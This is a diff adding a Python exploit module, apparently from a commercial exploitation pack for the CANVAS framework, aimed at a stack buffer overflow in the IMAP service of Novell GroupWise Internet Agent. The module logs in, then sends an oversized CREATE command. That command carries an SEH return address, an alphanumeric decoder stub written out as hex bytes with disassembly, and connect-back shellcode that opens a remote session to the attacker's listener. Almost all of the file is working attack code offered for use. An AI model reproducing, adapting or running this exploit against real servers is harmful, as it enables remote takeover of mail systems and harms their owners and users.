@@ -1,0 +1,195 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+
+import sys
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import struct
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import shellcodeGenerator
+from encoder import alphanumeric
+
+# GUI info
+NAME = "Novell GroupWise Internet Agent IMAP Stack Buffer Overflow Vulnerability"
+
+DESCRIPTION = "Stack Overflow Vulnerability in Novell GroupWise Internet Agent IMAP"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Novell"
+DOCUMENTATION["Date public"] = "2010.07.15"
+DOCUMENTATION["VersionsAffected"] = "Novell GroupWise < 8.02HP"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "One"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/41704"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "1.0"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : [ "GroupWise 8", 0x66244955 ], # pop pop ret
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.login = ""
+        self.pwd = ""
+        self.port = 143        
+        self.version = 0
+        return
+
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]    
+
+
+    def createShellcode(self):
+        if self.callback:
+        	host = self.callback.ip
+        	port = self.callback.port       
+      	      	      
+        self.shellcode = self.createHeapSafeInject(self.badstring, host, port)
+
+        encoder         = alphanumeric.AlphaNum()
+        totopc          = encoder.seh_pc()
+        getpc           = encoder.get_pc(reg='ecx')
+        
+        payload         = encoder.encode(self.shellcode)
+        self.shellcode  = totopc + getpc + payload                    
+
+
+    def run(self):
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.login = self.argsDict.get("login", self.login)
+        self.pwd = self.argsDict.get("pwd", self.pwd)
+                        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()                  
+
+        s = self.gettcpsock()        
+        s.connect((self.host, self.port))                               
+        s.recv(1024)
+        s.send("A001 LOGIN %s %s\r\n" % (self.login, self.pwd))
+        s.recv(1024)
+        s.send("A001 CREATE " + sploitstring + "\r\n")
+        s.recv(1024)        
+        s.close()
+
+        ret = self.ISucceeded()
+        
+        if not ret:
+        	self.log("Sleeping for two seconds to check for callback")
+        	time.sleep(2)
+        	ret = self.ISucceeded()        
+
+        if ret:
+        	self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+        	self.log("%s done (succeeded!)" % self.name)            
+        
+        return ret
+        
+        
+    def makesploit(self):							
+    	os_name, pop_pop = targets[self.version]
+
+    	ret = struct.pack('<L', pop_pop)	
+
+        """
+        56              PUSH ESI
+        333464          XOR ESI,DWORD PTR SS:[ESP]
+        56              PUSH ESI
+        58              POP EAX
+        3541424141      XOR EAX,41414241
+        3541574141      XOR EAX,41415741
+        48              DEC EAX
+        34 41           XOR AL,41
+        34 6e           XOR AL,6e
+        50              PUSH EAX
+        5A              POP EDX ; edx = 0x1500
+        4E              DEC ESI
+        56              PUSH ESI
+        58              POP EAX
+        3545514141      XOR EAX,41415145
+        50              PUSH EAX
+        59              POP ECX
+        56              PUSH ESI
+        58              POP EAX
+        34 41           XOR AL,41
+        34 57           XOR AL,57
+        54              PUSH ESP
+        5E              POP ESI
+        304432 30       XOR BYTE PTR DS:[ESI+EDX+30],AL
+        314C32 31       XOR DWORD PTR DS:[ESI+EDX+31],ECX
+        """
+        
+        alpha =  "\x56\x33\x34\x64\x56\x58"
+        alpha += "\x35\x41\x42\x41\x41"
+        alpha += "\x35\x41\x57\x41\x41"
+        alpha += "\x48\x34\x41\x34\x6e"
+        alpha += "\x50\x5A\x4E\x56\x58"
+        alpha += "\x35\x45\x51\x41\x41"
+        alpha += "\x50\x59\x56\x58"
+        alpha += "\x34\x57"
+        alpha += "\x54\x5E\x30\x44\x32\x30\x31\x4C\x32\x31"
+
+        sc = "A"*4300
+        sc = sc[:0x110] + self.shellcode + sc[len(self.shellcode)+0x110:]
+        
+        sploitstring = sc + ret + alpha + "A"*900
+            	    	    	    				    	    	    		    	
+    	return sploitstring
+      
+        		
+    def displayVersions(self):
+    	i = 0
+    	print 'Available versions:'
+    	for listline in targets.values():
+    		print "\t%d: %s" % (i,listline[0])
+    		i += 1
+
+
+    def usage(self):
+    	print "Usage: %s -v version -t targethost -p port -l localip -d localport\n" % (sys.argv[0])
+    	self.displayVersions()
+    	sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
